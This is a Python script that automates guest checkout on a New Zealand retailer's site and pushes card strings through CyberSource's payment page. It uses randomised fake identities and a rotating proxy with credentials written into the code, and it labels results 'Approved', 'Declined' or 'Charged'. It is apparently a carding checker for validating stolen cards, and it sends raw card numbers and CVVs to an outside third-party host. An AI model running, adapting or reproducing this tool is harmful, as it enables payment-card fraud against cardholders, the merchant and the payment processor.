
import base64
from bs4 import BeautifulSoup
import random
import urllib.parse
import aiohttp
import asyncio
import json 
import names
import platform
import html
import ssl
import certifi
import names
import random_address

genaddr = random_address.real_random_address()
address = genaddr['address1']
try: 
    City = genaddr['city']
except KeyError:
    City = "FL"
State = genaddr['state']
Zip_Code = genaddr['postalCode']
first = names.get_first_name()
last = names.get_last_name()
if platform.system()=='Windows':
    asyncio.set_event_loop_policy(asyncio.WindowsSelectorEventLoopPolicy())

telephone = f'78{random.randint(1000,9999)}{random.randint(1000,9999)}'
CorreoRand = f"{names.get_first_name()}{names.get_last_name()}{random.randint(10000,999999)}@gmail.com"

async def CybersourceCys(cc, proxyrand):
    async with aiohttp.ClientSession() as session:
        splitter = cc.split('|')
        ccnum    = splitter[0]
        mes      = splitter[1]
        ano      = splitter[2]
        cvv      = splitter[3]

        try:
            #---------------------------------REQUEST NUMERO 1---------------   ---------------#
            #---------------------------------REQUEST NUMERO 1---------------   ---------------#        
            session.headers.update({
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': '*/*',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                # 'Accept-Encoding': 'gzip, deflate, br',
                'Referer': 'https://www.kathmandu.co.nz/',
                'Store': 'nz_eng',
                'Origin': 'https://www.kathmandu.co.nz',
                })
            data = {
                "operationName":"createCart",
                "variables":{
                },
                "query":"mutation createCart { cartId: createEmptyCart } "
            }
            async with session.post('https://app.kathmandu.co.nz/graphql', json=data, timeout=20, proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/")) as resp:
                try :        
                    responses = await resp.text()
                    response = json.loads(responses)
                    cartid = response['data']['cartId']
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'  
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
                except aiohttp.client_exceptions.ContentTypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 01. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 2---------------   ---------------#
            #---------------------------------REQUEST NUMERO 2---------------   ---------------#
            data = {
                "operationName":"addProductsToCart",
                "variables":{
                    "cartId": cartid,
                    "cartItems":[
                        {
                        'quantity': 1,
                        'sku': '11481/',
                        'selected_options': [
                            'Y29uZmlndXJhYmxlLzE4Mi8yOQ==',
                            'Y29uZmlndXJhYmxlLzE4Ni8zOTY=',
                        ],
                        }
                    ]
                },
                "query":"mutation addProductsToCart($cartId: String!, $cartItems: [CartItemInput!]!) { addProductsToCart(cartId: $cartId, cartItems: $cartItems) { cart { ...CartFragment __typename } user_errors { code message __typename } __typename } } fragment CartFragment on Cart { id items { id amasty_free_gifts { is_free_gift rule_id __typename } prices { row_total_including_tax { value currency __typename } __typename } product { categories { id breadcrumbs { category_id category_name __typename } name path level include_in_menu __typename } id name brand_label kmd_product_label { name category_colour_left __typename } small_image { url __typename } upsell_message upsell_products { id name sku media_gallery_entries { label position disabled file __typename } url_key url_suffix stock_status special_price price_range { minimum_price { final_price { currency value __typename } regular_price { value currency __typename } __typename } __typename } groupPriceTiers { customer_group value __typename } __typename } sku stock_status groupPriceTiers { customer_group value __typename } special_price price_range { minimum_price { final_price { value currency __typename } regular_price { value currency __typename } __typename } __typename } wasPrice { value currency __typename } url_key url_suffix ... on ConfigurableProduct { configurable_options { attribute_code attribute_id id label __typename } variants { attributes { code value_index __typename } product { id sku groupPriceTiers { customer_group value __typename } special_price kmd_product_label { name category_colour_left __typename } price_range { minimum_price { final_price { value currency __typename } regular_price { value currency __typename } __typename } __typename } wasPrice { value currency __typename } stock_status media_gallery_entries { label position disabled file __typename } __typename } __typename } __typename } media_gallery_entries { file __typename } __typename } quantity ... on ConfigurableCartItem { configurable_options { id option_label value_id value_label configurable_product_option_value_uid __typename } __typename } ... on GiftCardCartItem { sender_name sender_email recipient_name recipient_email message amount { value currency __typename } __typename } __typename } is_virtual prices { grand_total { value currency __typename } subtotal_including_tax { value currency __typename } discounts { amount { currency value __typename } label __typename } __typename } applied_coupons { code __typename } applied_gift_cards { applied_balance { currency value __typename } code type current_balance { currency value __typename } __typename } shipping_addresses { selected_shipping_method { amount { currency value __typename } amount_including_tax { currency value __typename } __typename } __typename } free_shipping_details { free_shipping_active free_shipping_percentage free_shipping_threshold free_shipping_remaining price_of_non_free_shipping __typename } total_quantity __typename } "
            }
            async with session.post('https://app.kathmandu.co.nz/graphql', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), json=data, timeout=20) as resp:
                try :          
                    response = await resp.text()
                    Tries = 0
                    FinalTries = 0   
                    while Tries < 1:
                        if (int(response.find('Product that you are trying to add is not available.')) > 0):
                                data = {
                                    "operationName":"addProductsToCart",
                                    "variables":{
                                        "cartId": cartid,
                                        "cartItems":[
                                            {
                                            'quantity': 1,
                                            'sku': '11481/',
                                            'selected_options': [
                                                'Y29uZmlndXJhYmxlLzE4Mi8yOQ==',
                                                'Y29uZmlndXJhYmxlLzE4Ni8xNDYyNQ==',
                                            ],
                                            }
                                        ]
                                    },
                                    "query":"mutation addProductsToCart($cartId: String!, $cartItems: [CartItemInput!]!) { addProductsToCart(cartId: $cartId, cartItems: $cartItems) { cart { ...CartFragment __typename } user_errors { code message __typename } __typename } } fragment CartFragment on Cart { id items { id amasty_free_gifts { is_free_gift rule_id __typename } prices { row_total_including_tax { value currency __typename } __typename } product { categories { id breadcrumbs { category_id category_name __typename } name path level include_in_menu __typename } id name brand_label kmd_product_label { name category_colour_left __typename } small_image { url __typename } upsell_message upsell_products { id name sku media_gallery_entries { label position disabled file __typename } url_key url_suffix stock_status special_price price_range { minimum_price { final_price { currency value __typename } regular_price { value currency __typename } __typename } __typename } groupPriceTiers { customer_group value __typename } __typename } sku stock_status groupPriceTiers { customer_group value __typename } special_price price_range { minimum_price { final_price { value currency __typename } regular_price { value currency __typename } __typename } __typename } wasPrice { value currency __typename } url_key url_suffix ... on ConfigurableProduct { configurable_options { attribute_code attribute_id id label __typename } variants { attributes { code value_index __typename } product { id sku groupPriceTiers { customer_group value __typename } special_price kmd_product_label { name category_colour_left __typename } price_range { minimum_price { final_price { value currency __typename } regular_price { value currency __typename } __typename } __typename } wasPrice { value currency __typename } stock_status media_gallery_entries { label position disabled file __typename } __typename } __typename } __typename } media_gallery_entries { file __typename } __typename } quantity ... on ConfigurableCartItem { configurable_options { id option_label value_id value_label configurable_product_option_value_uid __typename } __typename } ... on GiftCardCartItem { sender_name sender_email recipient_name recipient_email message amount { value currency __typename } __typename } __typename } is_virtual prices { grand_total { value currency __typename } subtotal_including_tax { value currency __typename } discounts { amount { currency value __typename } label __typename } __typename } applied_coupons { code __typename } applied_gift_cards { applied_balance { currency value __typename } code type current_balance { currency value __typename } __typename } shipping_addresses { selected_shipping_method { amount { currency value __typename } amount_including_tax { currency value __typename } __typename } __typename } free_shipping_details { free_shipping_active free_shipping_percentage free_shipping_threshold free_shipping_remaining price_of_non_free_shipping __typename } total_quantity __typename } "
                                }
                                async with session.post('https://app.kathmandu.co.nz/graphql', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), json=data, timeout=20) as resp:         
                                    response = await resp.text()
                                    if (int(response.find('Cart Error')) > 0):
                                        Tries+=1
                                        FinalTries+=1
                                        print(f"[Require Retrie Cart Syberus] Tries: {Tries}")
                                    else :
                                        Tries+=1
                                        FinalTries+=0
                        else :
                            Tries+=1
                            FinalTries = 0
                    if int(FinalTries) >= 1 : return "Stock Problem!"
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'  
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 02. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 3---------------   ---------------#
            #---------------------------------REQUEST NUMERO 3---------------   ---------------#
            async with session.get('https://www.kathmandu.co.nz/checkout', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), timeout=20) as resp:
                try :          
                    response = await resp.text()
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'  
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 03. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 3---------------   ---------------#
            #---------------------------------REQUEST NUMERO 3---------------   ---------------#
 
            json_data = {
                'addressInformation': {
                    'shipping_address': {
                        'countryId': 'NZ',
                        'region': '',
                        'custom_attributes': {
                            'town': 'PARIKINO',
                        },
                        'street': [
                            '919K WHANGANUI RIVER ROAD',
                        ],
                        'company': '',
                        'postcode': '4576',
                        'city': 'WHANGANUI',
                        'firstname': first,
                        'lastname': last,
                        'telephone': telephone,
                        'saveInAddressBook': '0',
                    },
                    'billing_address': {
                        'countryId': 'NZ',
                        'region': '',
                        'custom_attributes': {
                            'town': 'PARIKINO',
                        },
                        'street': [
                            '919K WHANGANUI RIVER ROAD',
                        ],
                        'company': '',
                        'postcode': '4576',
                        'city': 'WHANGANUI',
                        'firstname': first,
                        'lastname': last,
                        'telephone': telephone,
                    },
                    'shipping_method_code': 'bestway',
                    'shipping_carrier_code': 'tablerate',
                },
            }
            async with session.post(f'https://app.kathmandu.co.nz/rest/nz_eng/V1/guest-carts/{cartid}/shipping-information', json=json_data, proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), timeout=20) as resp:
                try :          
                    response = await resp.text()
                except UnboundLocalError:
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️' 
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 04. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 4---------------   ---------------#
            #---------------------------------REQUEST NUMERO 4---------------   ---------------#
            data = {
                "operationName":"setGuestEmailOnCart",
                "variables":{
                    "cart_id": cartid,
                    "email":CorreoRand
                },
                "query":"mutation setGuestEmailOnCart($cart_id: String!, $email: String!) { setGuestEmailOnCart(input: {cart_id: $cart_id, email: $email}) { cart { email __typename } __typename } } "
            }
            async with session.post('https://app.kathmandu.co.nz/graphql', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), json=data, timeout=20) as resp:
                try :          
                    response = await resp.text()
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'  
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 05. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            data = {
                "operationName":"setBillingAddressOnCart",
                "variables":{
                    "cart_id": cartid,
                    "billing_address":{
                        "address":{
                            'country_code': 'NZ',
                            'region': '',
                            'street': [
                                '919K WHANGANUI RIVER ROAD',
                            ],
                            'company': '',
                            'postcode': '4576',
                            'city': 'WHANGANUI',
                            'firstname': first,
                            'lastname': last,
                            'telephone': telephone,
                            'save_in_address_book': False,
                        }
                    }
                },
                "query":"mutation setBillingAddressOnCart($cart_id: String!, $billing_address: BillingAddressInput!) { setBillingAddressOnCart(input: {cart_id: $cart_id, billing_address: $billing_address}) { cart { billing_address { firstname lastname company street city region { code label __typename } postcode telephone country { code label __typename } __typename } __typename } __typename } } "
            }
            async with session.post('https://app.kathmandu.co.nz/graphql', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), json=data, timeout=20) as resp:
                try :          
                    response = await resp.text()
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'  
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 06. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#
            #---------------------------------REQUEST NUMERO 5---------------   ---------------#

            json_data = {
                'operationName': 'setPaymentMethodAndPlaceOrder',
                'variables': {
                    'cart_id': cartid,
                    'payment_method': {
                        'code': 'chcybersource',
                    },
                },
                'query': 'mutation setPaymentMethodAndPlaceOrder($cart_id: String!, $payment_method: PaymentMethodInput!) {\n  setPaymentMethodOnCart(input: {cart_id: $cart_id, payment_method: $payment_method}) {\n    cart {\n      ...ReceiptCart\n      __typename\n    }\n    __typename\n  }\n  placeOrder(input: {cart_id: $cart_id}) {\n    order {\n      order_number\n      __typename\n    }\n    __typename\n  }\n}\n\nfragment ReceiptCart on Cart {\n  id\n  email\n  items {\n    prices {\n      row_total_including_tax {\n        value\n        currency\n        __typename\n      }\n      __typename\n    }\n    product {\n      name\n      small_image {\n        url\n        __typename\n      }\n      groupPriceTiers {\n        customer_group\n        value\n        __typename\n      }\n      price_range {\n        minimum_price {\n          regular_price {\n            currency\n            value\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      special_price\n      wasPrice {\n        value\n        currency\n        __typename\n      }\n      ... on ConfigurableProduct {\n        configurable_options {\n          attribute_code\n          attribute_id\n          id\n          label\n          __typename\n        }\n        variants {\n          attributes {\n            code\n            value_index\n            __typename\n          }\n          product {\n            media_gallery_entries {\n              label\n              position\n              disabled\n              file\n              __typename\n            }\n            groupPriceTiers {\n              customer_group\n              value\n              __typename\n            }\n            price_range {\n              minimum_price {\n                regular_price {\n                  currency\n                  value\n                  __typename\n                }\n                __typename\n              }\n              __typename\n            }\n            special_price\n            wasPrice {\n              value\n              currency\n              __typename\n            }\n            __typename\n          }\n          __typename\n        }\n        __typename\n      }\n      __typename\n    }\n    quantity\n    ... on ConfigurableCartItem {\n      configurable_options {\n        id\n        option_label\n        value_id\n        value_label\n        __typename\n      }\n      __typename\n    }\n    ... on GiftCardCartItem {\n      amount {\n        value\n        currency\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  is_virtual\n  prices {\n    grand_total {\n      currency\n      value\n      __typename\n    }\n    subtotal_including_tax {\n      currency\n      value\n      __typename\n    }\n    __typename\n  }\n  selected_payment_method {\n    code\n    purchase_order_number\n    title\n    __typename\n  }\n  billing_address {\n    firstname\n    __typename\n  }\n  shipping_addresses {\n    city\n    company\n    country {\n      code\n      label\n      __typename\n    }\n    firstname\n    lastname\n    postcode\n    region {\n      code\n      label\n      region_id\n      __typename\n    }\n    street\n    telephone\n    selected_shipping_method {\n      amount_including_tax {\n        currency\n        value\n        __typename\n      }\n      __typename\n    }\n    __typename\n  }\n  __typename\n}\n',
            }
            async with session.post('https://app.kathmandu.co.nz/graphql', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), json=json_data, timeout=20) as resp:
                try :          
                    response = await resp.text()
                    response = await resp.json()
                    ordernumber = response["data"]["placeOrder"]["order"]["order_number"]
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 07. It was not generated correctly. ♻️'  
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 07. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 6---------------   ---------------#
            #---------------------------------REQUEST NUMERO 6---------------   ---------------#
            variables = {"order_number":f"{ordernumber}","billing_lastname":last,"email_address":CorreoRand}
            params = {
                'query': 'query LoadCybersourceInfo($order_number:String!$billing_lastname:String!$email_address:String!){LoadCybersourceInfo(input:{order_number:$order_number billing_lastname:$billing_lastname email_address:$email_address}){access_key amount auth_indicator bill_address1 bill_address2 bill_city bill_country bill_to_address_city bill_to_address_country bill_to_address_line1 bill_to_address_line2 bill_to_address_postal_code bill_to_address_state bill_to_company_name bill_to_email bill_to_forename bill_to_phone bill_to_surname consumer_id currency customer_cookies_accepted customer_email customer_ip_address customer_lastname error ignore_avs ignore_cvn items{code name quantity sku tax_amount unit_price __typename}line_item_count locale merchant_defined_data1 merchant_defined_data2 merchant_defined_data3 merchant_defined_data4 merchant_defined_data5 merchant_defined_data6 merchant_defined_data20 merchant_defined_data21 merchant_defined_data22 merchant_defined_data23 merchant_defined_data31 merchant_defined_data32 merchant_secure_data1 merchant_secure_data2 merchant_secure_data3 override_custom_cancel_page override_custom_receipt_page partner_solution_id payer_auth_enroll_service_run payment_method profile_id reference_number request_url ship_to_address_city ship_to_address_country ship_to_address_line1 ship_to_address_line2 ship_to_address_postal_code ship_to_address_state ship_to_company_name ship_to_email ship_to_forename ship_to_phone ship_to_surname signature signed_date_time signed_field_names store_id tax_amount transaction_type transaction_uuid __typename}}',
                'operationName': 'LoadCybersourceInfo',
                'variables': f'{json.dumps(variables)}',
            }
            async with session.get('https://app.kathmandu.co.nz/graphql', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), params=params, timeout=20) as resp:
                try :          
                    response = await resp.json()
                    amount = response["data"]["LoadCybersourceInfo"]["amount"]
                    access_key = response["data"]["LoadCybersourceInfo"]["access_key"]
                    merchant_secure_data1 = response["data"]["LoadCybersourceInfo"]["merchant_secure_data1"]
                    merchant_secure_data2 = response["data"]["LoadCybersourceInfo"]["merchant_secure_data2"]
                    partner_solution_id = response["data"]["LoadCybersourceInfo"]["partner_solution_id"]
                    profile_id = response["data"]["LoadCybersourceInfo"]["profile_id"]
                    reference_number = response["data"]["LoadCybersourceInfo"]["reference_number"]
                    signature = response["data"]["LoadCybersourceInfo"]["signature"]
                    signed_date_time = response["data"]["LoadCybersourceInfo"]["signed_date_time"]
                    transaction_uuid = response["data"]["LoadCybersourceInfo"]["transaction_uuid"]
                    item_0_sku = response["data"]["LoadCybersourceInfo"]["items"][0]["sku"]
                    namepr = response["data"]["LoadCybersourceInfo"]["items"][0]["name"]

                    tax_amount_1 = response["data"]["LoadCybersourceInfo"]["items"][0]["tax_amount"]
                    unit_price_1 = response["data"]["LoadCybersourceInfo"]["items"][0]["unit_price"]
                    tax_amount_2 = response["data"]["LoadCybersourceInfo"]["items"][1]["tax_amount"]
                    unit_price_2 = response["data"]["LoadCybersourceInfo"]["items"][1]["unit_price"]
                    customer_ip_address = response["data"]["LoadCybersourceInfo"]["customer_ip_address"]
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 08. It was not generated correctly. ♻️'  
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 08. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 6---------------   ---------------#
            #---------------------------------REQUEST NUMERO 6---------------   ---------------#
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                'Host': 'secureacceptance.cybersource.com',
                'Origin': 'https://www.kathmandu.co.nz',
                'Connection': 'keep-alive',
                'Referer': 'https://www.kathmandu.co.nz/'
            }
           #data = f"access_key={access_key}&amount=20.00&bill_to_address_city=UPPER+HUTT&bill_to_address_country=NZ&bill_to_address_line1=1+Streets+Way&bill_to_address_postal_code=5018&bill_to_email=JuanitoManolo29%45PrWcWBvSAXGj8bD2EAcwLJEf6Bkfw9Y1EknVsZCggqiNixWMwTX9HNJQ24FVfuLa4t8eXt1HPA1iUitADJLCoS5ua3WQRcustomer_ip_address=20.204.18.187&line_item_count=2&locale=en-nz&merchant_defined_data23=web&merchant_defined_data31=tablerate_bestway&merchant_defined_data32=Standard+Shipping+-+Standard+Shipping&merchant_secure_data1={merchant_secure_data1}&merchant_secure_data2={urllib.parse.quote(merchant_secure_data2)}&merchant_secure_data3=1&override_custom_cancel_page=https%3A%2F%2Fapp.kathmandu.co.nz%2Fcybersource%2Findex%2Fcancel%2F&override_custom_receipt_page=https%3A%2F%2Fapp.kathmandu.co.nz%2Fcybersource%2Findex%2Fplaceorder%2F&partner_solution_id={partner_solution_id}&payer_auth_enroll_service_run=true&payment_method=card&profile_id={profile_id}&reference_number={reference_number}&ship_to_address_city=UPPER+HUTT&ship_to_address_country=NZ&ship_to_address_line1=1+Streets+Way&ship_to_address_postal_code=5018&ship_to_email=JuanitoManolo29%40gmail.com&ship_to_forename=Juan&ship_to_phone=78756543029&ship_to_surname=Izaza&signature={urllib.parse.quote(signature)}&signed_date_time={urllib.parse.quote(signed_date_time)}&signed_field_names=access_key%2Cprofile_id%2Cpartner_solution_id%2Clocale%2Creference_number%2Ccurrency%2Camount%2Ctransaction_uuid%2Cmerchant_secure_data1%2Cmerchant_secure_data3%2Cbill_to_forename%2Cbill_to_surname%2Cbill_to_email%2Cbill_to_address_line1%2Cbill_to_address_city%2Cbill_to_address_country%2Cbill_to_address_postal_code%2Cbill_to_phone%2Cship_to_forename%2Cship_to_surname%2Cship_to_email%2Cship_to_address_line1%2Cship_to_address_city%2Cship_to_address_country%2Cship_to_address_postal_code%2Cship_to_phone%2Ctransaction_type%2Cpayment_method%2Cmerchant_secure_data2%2Citem_0_code%2Citem_0_name%2Citem_0_quantity%2Citem_0_sku%2Citem_0_tax_amount%2Citem_0_unit_price%2Citem_1_code%2Citem_1_quantity%2Citem_1_unit_price%2Cline_item_count%2Cmerchant_defined_data23%2Cmerchant_defined_data31%2Cmerchant_defined_data32%2Ccustomer_ip_address%2Coverride_custom_receipt_page%2Coverride_custom_cancel_page%2Cpayer_auth_enroll_service_run%2Csigned_date_time%2Csigned_field_names&transaction_type=sale&transaction_uuid={transaction_uuid}&item_0_code=configurable&item_0_name=Combilock+3+Dial+Padlock++2+Pack&item_0_quantity=1&item_0_sku={item_0_sku}&item_0_tax_amount=1.30&item_0_unit_price=10.00&item_1_code=shipping_and_handling&item_1_quantity=1&item_1_unit_price=4.35"
            data = {
                'access_key': f'{access_key}',
                'amount': f'{amount}',
                'bill_to_address_city': 'WHANGANUI',
                'bill_to_address_country': 'NZ',
                'bill_to_address_line1': '919K WHANGANUI RIVER ROAD',
                'bill_to_address_postal_code': '4576',
                'bill_to_email': CorreoRand,
                'bill_to_forename': first,
                'bill_to_phone': telephone,
                'bill_to_surname': last,
                'currency': 'NZD',
                'customer_ip_address': customer_ip_address,
                'line_item_count': '2',
                'locale': 'en-nz',
                'merchant_defined_data23': 'web',
                'merchant_defined_data31': 'tablerate_bestway',
                'merchant_defined_data32': 'Standard Shipping - Standard Shipping',
                'merchant_secure_data1': f'{merchant_secure_data1}',
                'merchant_secure_data2': f'{merchant_secure_data2}',
                'merchant_secure_data3': '1',
                'override_custom_cancel_page': 'https://app.kathmandu.co.nz/cybersource/index/cancel/',
                'override_custom_receipt_page': 'https://app.kathmandu.co.nz/cybersource/index/placeorder/',
                'partner_solution_id': f'{partner_solution_id}',
                'payer_auth_enroll_service_run': 'true',
                'payment_method': 'card',
                'profile_id': f'{profile_id}',
                'reference_number': f'{reference_number}',
                'ship_to_address_city': 'WHANGANUI',
                'ship_to_address_country': 'NZ',
                'ship_to_address_line1': '919K WHANGANUI RIVER ROAD',
                'ship_to_address_postal_code': '4576',
                'ship_to_email': CorreoRand,
                'ship_to_forename': first,
                'ship_to_phone': telephone,
                'ship_to_surname': last,
                'signature': f'{signature}',
                'signed_date_time': f'{signed_date_time}',
                'signed_field_names': 'access_key,profile_id,partner_solution_id,locale,reference_number,currency,amount,transaction_uuid,merchant_secure_data1,merchant_secure_data3,bill_to_forename,bill_to_surname,bill_to_email,bill_to_address_city,bill_to_address_country,bill_to_address_postal_code,bill_to_phone,bill_to_address_line1,ship_to_forename,ship_to_surname,ship_to_email,ship_to_address_city,ship_to_address_country,ship_to_address_postal_code,ship_to_phone,ship_to_address_line1,transaction_type,payment_method,merchant_secure_data2,item_0_code,item_0_name,item_0_quantity,item_0_sku,item_0_tax_amount,item_0_unit_price,item_1_code,item_1_quantity,item_1_unit_price,item_1_tax_amount,line_item_count,merchant_defined_data23,merchant_defined_data31,merchant_defined_data32,customer_ip_address,override_custom_receipt_page,override_custom_cancel_page,payer_auth_enroll_service_run,signed_date_time,signed_field_names',
                'transaction_type': 'sale',
                'transaction_uuid': f'{transaction_uuid}',
                'item_0_code': 'configurable',
                'item_0_name': f'{namepr}',
                'item_0_quantity': '1',
                'item_0_sku': f'{item_0_sku}',
                'item_0_tax_amount': f'{tax_amount_1}',
                'item_0_unit_price': f'{unit_price_1}',
                'item_1_code': 'shipping_and_handling',
                'item_1_quantity': '1',
                'item_1_tax_amount': f'{tax_amount_2}',
                'item_1_unit_price': f'{unit_price_2}',
            }
            async with session.post('https://secureacceptance.cybersource.com/pay', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), data=data, timeout=20) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                    session_uuid = soup.find("input", {"name": "session_uuid"})["value"]
                    keyencrypt = soup.find("input", {"id": "jwk"})["value"]
                    keyencrypt = json.loads(keyencrypt)
                    keyencrypt = keyencrypt["n"]
                    authenticity_token = soup.find("input", {"name": "authenticity_token"})["value"]
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'  
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 09. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 6---------------   ---------------#
            #---------------------------------REQUEST NUMERO 6---------------   ---------------#
            async def EncryptValue(cc, keyvalue) :
                async with aiohttp.ClientSession() as session:
                    splitter = cc.split('|')
                    ccnum    = splitter[0]
                    cvv      = splitter[3] 
                    headers = {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:101.0) Gecko/20100101 Firefox/101.0',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
                        'Accept-Language': 'es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3',
                        'yakuza-nonce':'eb39ca24-3b4f-5001-9762-99c9a80f06be'
                    }
                    data = {
                        "jwk": {
                            "kty": "RSA",
                            "n": keyvalue, 
                            "e": "AQAB"
                        },
                        "data": [ccnum, cvv]
                    } 
                    async with session.post('https://api.xn--45qx7by8s.online/cybersource', json=data, headers=headers, proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/")) as resp:
                        try :
                            jsonresponse = await resp.json()
                            number = jsonresponse["response"][0]
                            cvv = jsonresponse["response"][1]
                            return number, cvv
                        except UnboundLocalError :
                            return 'An unexpected error occurred in request 10. It was not generated correctly. ♻️'
            #---------------------------------REQUEST NUMERO 6---------------------------------#
            #---------------------------------REQUEST NUMERO 6---------------------------------#  
            EncryptValue = await EncryptValue(cc, keyencrypt)
            if EncryptValue == 'An unexpected error occurred in request 10. It was not generated correctly. ♻️' : return EncryptValue

            listaone = ccnum[0:1]
            if (listaone == '4') :
                tipo = '001'
            elif (listaone == '5') :
                tipo = '002'
                
            data = {
                'utf8': '?',
                'authenticity_token': authenticity_token,
                'session_uuid': session_uuid,
                'payment_method': 'card',
                'card_type': tipo,
                'card_number': ccnum,
                '__e.card_number': EncryptValue[0],
                'card_expiry_month': mes,
                'card_expiry_year': ano,
                'card_cvn': cvv,
                '__e.card_cvn': EncryptValue[1],
                'customer_utc_offset': '-420',
            }
            async with session.post(f'https://secureacceptance.cybersource.com/checkout_update', proxy=str("http://soqjbqee-rotate:vwef3eyuaea7@p.webshare.io:80/"), data=data, timeout=20) as resp:
                try :          
                    response = await resp.text()
                    soup = BeautifulSoup(response , 'lxml')
                except UnboundLocalError :
                    await session.close()
                    return 'An unexpected error occurred in request 11. It was not generated correctly. ♻️'  
                except TypeError :
                    await session.close()
                    return 'An unexpected error occurred in request 11. It was not generated correctly. ♻️'
            #------------    ---------------------CHECCK REQUESTS---------------   ---------------#
            if int(response.find('id="auth_cv_result"')) > 0 :#Card Verification check failed by payment processor.
                if (int(response.find('Decline for CVV2 failure')) > 0) or (int(response.find('AVS check failed')) > 0) or (int(response.find('Not sufficient funds')) > 0) or (int(response.find('Card Verification check failed by payment processor.')) > 0):
                    message = soup.find("input", {"name": "message"})["value"]
                    auth_avs_code = soup.find("input", {"name": "auth_avs_code"})["value"]
                    auth_cv_result = soup.find("input", {"name": "auth_cv_result"})["value"]
                    await session.close()
                    return "Approved", message, auth_avs_code, auth_cv_result
                elif (int(response.find('Request was processed successfully')) > 0):
                    auth_avs_code = soup.find("input", {"name": "auth_avs_code"})["value"]
                    auth_cv_result = soup.find("input", {"name": "auth_cv_result"})["value"]
                    await session.close()
                    return "Approved", "Charged 21$", auth_avs_code, auth_cv_result
                else :
                    auth_avs_code = soup.find("input", {"name": "auth_avs_code"})["value"]
                    auth_cv_result = soup.find("input", {"name": "auth_cv_result"})["value"]
                    message = soup.find("input", {"name": "message"})["value"]
                    await session.close()
                    return "Declined", message, auth_avs_code, auth_cv_result
            elif (int(response.find('Decline for CVV2 failure')) > 0) or (int(response.find('Not sufficient funds')) > 0) or (int(response.find('AVS check failed')) > 0):
                message = soup.find("input", {"name": "message"})["value"]
                await session.close()
                return "ApprovedSinCVV", message
            elif (int(response.find('name="message"')) > 0):
                message = soup.find("input", {"name": "message"})["value"]
                await session.close()
                return "DeclinedSinCVV", message
            else :
                await session.close()
                print(response)
                return "An unexpected error occurred in response. It was not generated correctly. ♻️"
        except (aiohttp.client_exceptions.ServerDisconnectedError):
            return "An unexpected error occurred. ServerDisconnectedError. ♻️"
        except (asyncio.exceptions.TimeoutError):
            return "An unexpected error occurred. Timeout Error. ♻️"
        except (aiohttp.client_exceptions.ClientConnectorError):
            return "An unexpected error occurred. ClientConnectorError. ♻️"